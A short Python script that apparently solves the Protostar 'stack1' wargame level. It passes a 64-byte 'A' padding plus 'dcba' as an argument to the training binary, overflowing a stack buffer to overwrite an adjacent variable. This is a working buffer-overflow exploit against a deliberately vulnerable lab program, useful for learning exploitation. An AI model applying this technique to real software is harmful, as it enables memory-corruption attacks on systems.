import subprocess

def main():
    flag = (("A" * 64) + "dcba")
    process = "/opt/protostar/bin/stack1"

    subprocess.Popen([process, flag], stdin=subprocess.PIPE)

if __name__ == '__main__':
    main()

